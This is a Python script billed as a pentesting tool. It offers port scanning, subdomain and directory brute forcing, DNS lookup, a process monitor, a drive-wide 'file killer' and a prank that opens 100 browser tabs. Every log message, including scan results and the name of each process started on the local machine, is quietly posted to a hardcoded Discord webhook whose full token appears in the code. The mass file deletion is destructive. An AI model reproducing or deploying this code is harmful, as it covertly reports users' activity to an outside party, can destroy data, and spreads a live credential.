import os
import time
import threading
import subprocess
import psutil
import requests
import socket
import webbrowser
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1401191759765307475/LDe50YHyFjLl6b5TC3Qpiy8LR5iUyeI8iqJuqjU0M8--J0P5fPjVgRj3UQ9Gk5QCjv_x"

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    @staticmethod
    def log(message, level="info"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if level == "info":
            print(f"{Colors.OKCYAN}[{timestamp}] INFO: {message}{Colors.ENDC}")
        elif level == "warning":
            print(f"{Colors.WARNING}[{timestamp}] WARNING: {message}{Colors.ENDC}")
        elif level == "error":
            print(f"{Colors.FAIL}[{timestamp}] ERROR: {message}{Colors.ENDC}")
        elif level == "success":
            print(f"{Colors.OKGREEN}[{timestamp}] SUCCESS: {message}{Colors.ENDC}")
        
        # Always send logs to Discord
        Logger.send_discord_log(f"[{timestamp}] {message.upper()}")

    @staticmethod
    def send_discord_log(message):
        data = {"content": message}
        try:
            response = requests.post(WEBHOOK_URL, json=data, timeout=5)
            if response.status_code != 204:
                print(f"{Colors.FAIL}[Discord] Failed to send log, status code: {response.status_code}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[Discord] Failed to send log: {e}{Colors.ENDC}")

def print_logo():
    logo = r"""
    _____ _____ _   _   _    
   /  __ \_   _| \ | | | |   
  | /  \/ | | |  \| |  | |   
  | |     | | | . ` |  | |   
  | \__/\_| |_| |\  |  | |____
   \____/\___/\_| \_/   \_____/     
    """
    print(Colors.OKCYAN + logo + Colors.ENDC)
    print(f"{Colors.BOLD}Advanced Pentesting Tool v2.0{Colors.ENDC}\n")
    print(f"{Colors.WARNING}NOTE: Use this tool only on systems you have permission to test.{Colors.ENDC}\n")

def ping_ip(ip):
    Logger.log(f"Pinging {ip}...")
    param = '-n' if os.name == 'nt' else '-c'
    try:
        output = subprocess.check_output(['ping', param, '4', ip], stderr=subprocess.STDOUT)
        print(output.decode())
        Logger.send_discord_log(f"Ping results for {ip}:\n```\n{output.decode()}\n```")
    except subprocess.CalledProcessError as e:
        Logger.log(f"Ping failed for {ip}: {e.output.decode()}", "error")

def simple_site_test(url):
    Logger.log(f"Testing site {url}...")
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        r = requests.get(url, timeout=10)
        Logger.log(f"Status Code: {r.status_code}", "success")
        Logger.log(f"Headers: {r.headers}", "info")
        
        # Send detailed info to Discord
        headers_str = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        Logger.send_discord_log(f"Site test for {url}:\nStatus: {r.status_code}\nHeaders:\n{headers_str}")
    except Exception as e:
        Logger.log(f"Error testing site: {e}", "error")

def create_malware_file(filename):
    if not filename:
        Logger.log("No filename provided", "error")
        return
        
    content = """@echo off
echo This is a test malware file!
pause
"""
    try:
        with open(filename, 'w') as f:
            f.write(content)
        Logger.log(f"Malware file '{filename}' created", "success")
    except Exception as e:
        Logger.log(f"Error creating file: {e}", "error")

def monitor_processes(stop_event):
    known = set(p.pid for p in psutil.process_iter())
    Logger.log("Process monitoring started", "success")
    
    while not stop_event.is_set():
        current = set(p.pid for p in psutil.process_iter())
        started = current - known
        stopped = known - current
        
        for pid in started:
            try:
                p = psutil.Process(pid)
                msg = f"Process started: {p.name()} (PID: {pid})"
                Logger.log(msg, "info")
            except:
                pass
                
        for pid in stopped:
            msg = f"Process stopped: PID {pid}"
            Logger.log(msg, "warning")
            
        known = current
        time.sleep(2)
        
    Logger.log("Process monitoring stopped", "warning")

def port_scanner(target_ip, start_port=1, end_port=1024):
    if not target_ip:
        Logger.log("No target IP provided", "error")
        return
        
    Logger.log(f"Scanning ports on {target_ip} from {start_port} to {end_port}...")
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
            Logger.log(f"Port {port} is open", "success")
        sock.close()
        
    if open_ports:
        Logger.log(f"Open ports on {target_ip}: {open_ports}", "success")
        Logger.send_discord_log(f"Port scan results for {target_ip}:\nOpen ports: {open_ports}")
    else:
        Logger.log(f"No open ports found on {target_ip}", "warning")

def subdomain_finder(domain):
    if not domain:
        Logger.log("No domain provided", "error")
        return
        
    Logger.log(f"Finding subdomains for {domain}...")
    subdomains = ['www', 'mail', 'ftp', 'test', 'dev', 'admin', 'webmail', 
                 'portal', 'api', 'blog', 'shop', 'app', 'cloud', 'ns1', 'ns2']
    found = []
    
    for sub in subdomains:
        full_domain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full_domain)
            msg = f"Found: {full_domain} -> {ip}"
            Logger.log(msg, "success")
            found.append(full_domain)
        except socket.gaierror:
            pass
            
    if not found:
        Logger.log(f"No subdomains found for {domain}", "warning")
    else:
        Logger.send_discord_log(f"Subdomains found for {domain}:\n" + "\n".join(found))

def http_header_grabber(url):
    if not url:
        Logger.log("No URL provided", "error")
        return
        
    Logger.log(f"Grabbing HTTP headers from {url}...")
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        r = requests.head(url, timeout=10)
        headers_str = "\n".join(f"{header}: {value}" for header, value in r.headers.items())
        Logger.log(f"Headers from {url}:\n{headers_str}", "info")
        Logger.send_discord_log(f"HTTP headers for {url}:\n{headers_str}")
    except Exception as e:
        Logger.log(f"Error grabbing headers: {e}", "error")

def directory_bruteforce(url):
    if not url:
        Logger.log("No URL provided", "error")
        return
        
    Logger.log(f"Starting directory brute force on {url}...")
    wordlist = ['admin', 'login', 'test', 'backup', 'old', 'wp-admin', 
               'administrator', 'phpmyadmin', 'db', 'sql', 'config']
    found = []
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        
    for word in wordlist:
        full_url = f"{url.rstrip('/')}/{word}"
        try:
            r = requests.get(full_url, timeout=3)
            if r.status_code == 200:
                msg = f"Found directory: {full_url}"
                Logger.log(msg, "success")
                found.append(full_url)
        except:
            pass
            
    if not found:
        Logger.log(f"No directories found on {url}", "warning")
    else:
        Logger.send_discord_log(f"Found directories on {url}:\n" + "\n".join(found))

def dns_lookup(domain):
    if not domain:
        Logger.log("No domain provided", "error")
        return
        
    Logger.log(f"Performing DNS lookup for {domain}...")
    try:
        ip = socket.gethostbyname(domain)
        Logger.log(f"{domain} resolved to {ip}", "success")
        Logger.send_discord_log(f"DNS lookup for {domain}: {ip}")
    except Exception as e:
        Logger.log(f"Error in DNS lookup: {e}", "error")

def file_killer(filename):
    if not filename:
        Logger.log("No filename provided", "error")
        return
        
    confirm = input(f"{Colors.WARNING}Are you sure you want to delete ALL files named '{filename}'? (yes/no): {Colors.ENDC}").strip().lower()
    if confirm != 'yes':
        Logger.log("File killer aborted", "warning")
        return
        
    Logger.log(f"Starting file killer for files named '{filename}'...", "warning")
    drives = []
    
    if os.name == 'nt':
        import string
        drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    else:
        drives = ['/']
        
    deleted_files = 0
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if filename in files:
                file_path = os.path.join(root, filename)
                try:
                    os.remove(file_path)
                    Logger.log(f"Deleted: {file_path}", "success")
                    deleted_files += 1
                except Exception as e:
                    Logger.log(f"Failed to delete {file_path}: {e}", "error")
                    
    if deleted_files == 0:
        Logger.log(f"No files named '{filename}' found to delete", "warning")
    else:
        Logger.log(f"Total files deleted: {deleted_files}", "success")
        Logger.send_discord_log(f"File killer deleted {deleted_files} files named '{filename}'")

def open_firefox_tabs():
    Logger.log("Opening 100 Firefox tabs with 'cina watched you'...", "warning")
    url = "https://www.google.com/search?q=cina+watched+you"
    
    try:
        for _ in range(100):
            webbrowser.get('firefox').open_new_tab(url)
            time.sleep(0.1)  # Small delay to prevent crashing
        Logger.log("100 tabs opened in Firefox", "success")
    except Exception as e:
        Logger.log(f"Error opening tabs: {e}", "error")

def print_menu():
    print(f"\n{Colors.HEADER}{Colors.BOLD}=== MAIN MENU ==={Colors.ENDC}")
    print(f"{Colors.UNDERLINE}Select an option:{Colors.ENDC}\n")
    
    menu_options = [
        ("1", "Site penetration test"),
        ("2", "Ping an IP address"),
        ("3", "Create test malware file"),
        ("4", "Process Monitor (Start/Stop)"),
        ("5", "Port scanner"),
        ("6", "Subdomain finder"),
        ("7", "HTTP header grabber"),
        ("8", "Directory brute force"),
        ("9", "DNS lookup"),
        ("10", "File killer (DANGEROUS)"),
        ("11", "Open 100 Firefox tabs"),
        ("12", "Exit")
    ]
    
    for num, desc in menu_options:
        print(f" {Colors.OKCYAN}{num}.{Colors.ENDC} {desc}")
    
    print(f"\n{Colors.WARNING}Current status: {Colors.ENDC}", end="")
    if 'monitor_thread' in globals() and monitor_thread.is_alive():
        print(f"{Colors.OKGREEN}Process Monitor: ACTIVE{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}Process Monitor: INACTIVE{Colors.ENDC}")

def main():
    global monitor_thread, stop_event
    
    print_logo()
    Logger.log("Tool initialized", "info")
    
    stop_event = threading.Event()
    monitor_thread = None
    
    while True:
        print_menu()
        choice = input(f"\n{Colors.BOLD}Enter your choice (1-12): {Colors.ENDC}").strip()
        
        try:
            if choice == '1':
                url = input("Enter website URL: ").strip()
                simple_site_test(url)
            elif choice == '2':
                ip = input("Enter IP address: ").strip()
                ping_ip(ip)
            elif choice == '3':
                filename = input("Enter malware filename (e.g., test.bat): ").strip()
                create_malware_file(filename)
            elif choice == '4':
                if monitor_thread and monitor_thread.is_alive():
                    stop_event.set()
                    monitor_thread.join()
                    monitor_thread = None
                    Logger.log("Process monitoring stopped", "warning")
                else:
                    stop_event.clear()
                    monitor_thread = threading.Thread(target=monitor_processes, args=(stop_event,))
                    monitor_thread.daemon = True
                    monitor_thread.start()
            elif choice == '5':
                target_ip = input("Enter target IP: ").strip()
                start_port = input(f"Start port (default 1): ").strip() or "1"
                end_port = input(f"End port (default 1024): ").strip() or "1024"
                port_scanner(target_ip, int(start_port), int(end_port))
            elif choice == '6':
                domain = input("Enter domain (e.g., example.com): ").strip()
                subdomain_finder(domain)
            elif choice == '7':
                url = input("Enter URL: ").strip()
                http_header_grabber(url)
            elif choice == '8':
                url = input("Enter base URL: ").strip()
                directory_bruteforce(url)
            elif choice == '9':
                domain = input("Enter domain: ").strip()
                dns_lookup(domain)
            elif choice == '10':
                filename = input("Enter filename to delete: ").strip()
                file_killer(filename)
            elif choice == '11':
                open_firefox_tabs()
            elif choice == '12':
                if monitor_thread and monitor_thread.is_alive():
                    stop_event.set()
                    monitor_thread.join()
                Logger.log("Exiting tool...", "info")
                break
            else:
                Logger.log("Invalid option selected", "error")
                
            input(f"\n{Colors.OKBLUE}Press Enter to continue...{Colors.ENDC}")
        except Exception as e:
            Logger.log(f"Error: {str(e)}", "error")

if __name__ == "__main__":
    main()